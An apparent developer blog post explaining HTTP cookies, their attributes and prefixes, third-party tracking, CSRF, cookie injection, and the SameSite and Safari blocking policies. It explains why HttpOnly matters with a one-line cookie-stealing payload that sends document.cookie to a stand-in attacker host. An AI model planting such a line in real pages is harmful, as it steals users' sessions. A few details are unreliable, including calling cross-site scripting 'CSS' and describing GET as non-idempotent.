---
title: 'Cookie Recipes'
date: 2020-04-12 08:00:09
category: web
thumbnail: './images/cookie/thumbnail.png'
---

![image-thumbnail](./images/cookie/thumbnail.png)

<div style="opacity: 0.5; padding-right: 15px; text-align:right">
    <sup>Image by: <a href="https://www.freepik.com/premium-vector/hand-drawn-illustration-cookie_2795450.htm">https://www.freepik.com/</a></sup>
</div>

Between last year's [Chrome SameSite](https://www.chromium.org/updates/same-site) policy and whatever authentication feature you last had to build, chances are "cookies" have crossed your radar at some point. Here's what a cookie actually is, the different kinds out there, and the browser policies shaped around how they behave.

## Cookies

A cookie is a small file the browser holds onto on a website's behalf. A database stores data because the client asked it to; a cookie works the other way around — it's the server telling the client, **"Hang onto this for me!"**

Cookies ride on top of HTTP headers. A server asks the client to store something, say a date, through a response header like this.

```js
Set-Cookie: DATE=March/4/2020
```

It's sent as `name=value`, and the client stores that pair. That's how a server can tell, for instance, whether this is your first visit to a site.

The browser can read and set cookies too.

```js
console.log(document.cookie)
--
[Result of testing on the Twitter site]
guest_id=v1%3A1...; _ga=GA1.2...
```

## Cookie Attributes

A cookie takes the form `<cookie-name>=<cookie-value>`. `cookie-name` has to be ASCII, excluding control characters, spaces, and tabs, and it can't contain special symbols.

- **__Secure-**: Any cookie name starting with `__Secure-` must carry the `secure` flag, and the page must be HTTPS.
- **__Host-**: A `__Host-` cookie needs all of that too, plus no domain specified (so it can never be shared with subdomains), and its Path must be `/`.

```js
// Example
// __Secure- prefix requires the Secure attribute.
// Since it has no Secure attribute, this cookie is ignored.
document.cookie = '__Secure-invalid-without-secure=1';
// __Secure- prefix cookie applied correctly
document.cookie = '__Secure-valid-with-secure=1; Secure';

// __Host- prefix cookies are ignored if either
// Path or Secure is missing.
document.cookie = '__Host-invalid-without-secure-or-path=1';
document.cookie = '__Host-invalid-without-path=1; Secure';

// __Host- prefix cookie applied correctly
document.cookie = '__Host-valid-with-secure-and-path=1; Secure; Path=/';
```

A handful of optional attributes round out a cookie's definition.

**Expires=\<date>**

How long the cookie can live. Skip it and the browser treats the cookie as a **session cookie**, wiping it once the client closes. This is measured relative to the client, not the server.

**Max-Age=\<number>**

Seconds until the cookie expires. 0 or negative expires it immediately, and IE6, 7, and 8 don't honor this header at all. Set both `Expires` and `Max-Age`, and `Max-Age` wins.

**Domain=\<domain-value>**

Domain scopes the cookie, marking which site owns it. Skip it and the current page's URL becomes the scope. A cookie set with `Domain=so-so.dev`, for example, is off-limits to every site except so-so.dev.

**Path=\<path-value>**

The URL path a request has to fall under before the cookie gets attached. Set `path=/soso` and the cookie ships along with requests to `/soso`, `/soso/jbee`, and so on.

**Secure**

Cookies flagged this way only go out over HTTPS, when the server is actually using SSL.

**HttpOnly**

An attribute that shields the cookie from the page's own scripts.

Without it, an attacker could grab a user's cookies with something as simple as this.

```js
location.href = 'https://😈.com?cookies=' + document.cookie
```

Slip that into a forum post or an email, get someone to click it, and every cookie that user has gets shipped straight to the 😈 site.

HttpOnly is the defense: it blocks document.cookie from reading the cookie at all, which shuts this exact flavor of CSS (Cross-Site Scripting) attack down cold.

## Things to Watch Out For

Cookies are convenient, but they come with real limits, so treat them carefully.

### Persistence

First: persistence. A cookie isn't guaranteed to survive no matter what. Incognito mode, or a tightened browser security setting, can simply ignore the server's request to keep a cookie around past the session. So cookies are best reserved for **information you can afford to lose, or anything the server can reconstruct on its own**.

### Size

A cookie tops out at 4KB. That's not much room, and since every cookie tags along with every request, it adds overhead to your traffic — overhead that slows down both the request and the response.

### Security

Last, security. Add the `secure` attribute and the cookie only travels encrypted, over HTTPS — but plain HTTP still ships it as cleartext. Never park a password in one, and even encrypted, the user can poke at it freely, so tampering is always a risk.

### Cookie Injection

Cookie injection turns the cookie spec against itself to slip past an HTTPS connection. An attacker overwrites the cookie of a domain that's supposed to be locked to HTTPS (say, *example.com*) from a plain-HTTP subdomain (*subdomain.example.com*), or sets a more specific cookie path (*example.com/someapp*) to knock out the cookie that domain was relying on.

Chrome and Firefox rolled out [countermeasures](https://www.chromestatus.com/feature/4506322921848832) for this back in March 2017.

Subdomains can no longer reconfigure a cookie this way, and even on the same domain, a `secure` cookie can't be clobbered over plain HTTP anymore.

## First Party, Third Party

A First Party cookie is one the service you're on writes for itself, valid only within that service. A Third Party cookie is the opposite: something planted so an outside service, usually an ad network, can read it and track behavior across sites you never gave it direct access to.

A Third Party cookie belongs to a different site (ad-tech.com) than the one you're actually on (origin.com).

![first-vs-third](./images/cookie/first-vs-third.png)

origin.com pulls this off with a tag like the following.

```html
<a href="ad.doubleclick.net/some-other-parameters-specific-to-this-ad" target="_blank" rel="noopener">
  <img src="ad.doubleclick.net/the-extension-to-the-creative">
</a>
```

The page loads, the ad markup loads with it, a request goes out to *[ad.doubleclick.net/the-extension-to-the-creative](http://ad.doubleclick.net/the-extension-to-the-creative)*, and a cookie comes back to the user.

Third Party cookies drag their own security baggage along. Say a user logs into a bank to pay off a credit card, doesn't log out, and wanders onto a malicious site — that's a CSRF attack waiting to happen. The user is still "authenticated" on the bank's side, so the malicious page can trigger something like a transfer without them noticing.

Here's another angle: imagine someone embeds an so-so.dev image on their own site. If a visitor already picked up an so-so.dev cookie at some point, requesting that image from the other site sends the cookie right along with it. The other site never touches that cookie directly, but because the request still goes to so-so.dev, the cookie effectively gets used from somewhere it was never meant to be.

Flip it around: if someone's logged into evil.com and evil.com happens to load an so-so.dev image, that request goes straight to so-so.dev too.

## Chrome - SameSite

To shut down exactly this kind of risk, Google rolled out a cookie policy called SameSite. It puts the SameSite attribute on the `Set-Cookie` header, and it's now on developers to configure it.

SameSite takes one of three values: Strict, Lax, or None.

|Value|Description|
|------|---|
|Strict|A cookie set this way is only ever readable when you're visiting the exact domain that set it, full stop — no cross-site use at all. Best fit for something like a banking app.|
|Lax|Cookies with this setting are sent only on same-site requests or top-level navigation with non-idempotent HTTP requests, like HTTP GET . So this is the middle ground: a third party can still use the cookie, while getting some protection from CSRF along the way.|
|None|Business as usual — the cookie stays usable in a Third Party context.|

Set `SameSite=Lax`, and the cookie only survives navigation within the same top-level domain (so-so.dev → statis.so-so.dev, say).

```html
<p>Example</p>
<img src="https://other.dev/img/amazing-cat.png" />
<p>Read the <a href="https://other.dev/cat.html">article</a>.</p>
```

Here's the cookie behind that example.

```
Set-Cookie: test=1; SameSite=Lax
```

Sitting on so-so.dev, the cookie never goes out — but click through to `[https://other.dev/cat.html](https://other.dev/cat.html)` and it does. `Lax` fits cookies that shape what the site actually shows you.

Chrome flipped its default to `SameSite=Lax` starting in version 80. Want `SameSite=None` instead? You'll need to tack on Secure too.

```
Set-cookie: 3pcookie=value; SameSite=None; Secure
```

## Webkit - Full Third-Party Cookie Blocking

Safari 13.1 landed a major shift in Intelligent Tracking Prevention (ITP). Per Apple's John Wilander, a WebKit engineer, Safari now **blocks Third Party cookies** outright. (This tracks with Google's SameSite move, except where Google is rolling it out gradually through 2020, Safari just flipped the switch to 100% in 13.1.)

<a href="https://twitter.com/johnwilander/status/1242513313507860480?ref_src=twsrc^tfw|twcamp^tweetembed|twterm^1242513313507860480&ref_url=https%3A%2F%2Fwww.theverge.com%2F2020%2F3%2F24%2F21192830%2Fapple-safari-intelligent-tracking-privacy-full-third-party-cookie-blocking">
  <img src="/media/web/images/cookie/twitter.png"/>
</a>

## Ref

- [https://webkit.org/blog/10218/full-third-party-cookie-blocking-and-more/](https://webkit.org/blog/10218/full-third-party-cookie-blocking-and-more/)
- [http://www.hanbit.co.kr/store/books/look.php?p_code=B7009240426](http://www.hanbit.co.kr/store/books/look.php?p_code=B7009240426)
- [https://clearcode.cc/blog/difference-between-first-party-third-party-cookies/#first-vs-third](https://clearcode.cc/blog/difference-between-first-party-third-party-cookies/#first-vs-third)
- [https://docs.adobe.com/content/help/ko-KR/target/using/implement-target/before-implement/privacy/google-chrome-samesite-cookie-policies.translate.html](https://docs.adobe.com/content/help/ko-KR/target/using/implement-target/before-implement/privacy/google-chrome-samesite-cookie-policies.translate.html)
- [https://ifuwanna.tistory.com/223](https://ifuwanna.tistory.com/223)
- [https://www.yceffort.kr/2020/01/chrome-cookie-same-site-secure/](https://www.yceffort.kr/2020/01/chrome-cookie-same-site-secure/)
- [https://googlechrome.github.io/samples/cookie-prefixes/](https://googlechrome.github.io/samples/cookie-prefixes/)
- [https://developers-kr.googleblog.com/2020/01/developers-get-ready-for-new.html](https://developers-kr.googleblog.com/2020/01/developers-get-ready-for-new.html)
- [https://medium.com/cross-site-request-forgery-csrf/double-submit-cookie-pattern-65bb71d80d9f](https://medium.com/cross-site-request-forgery-csrf/double-submit-cookie-pattern-65bb71d80d9f)
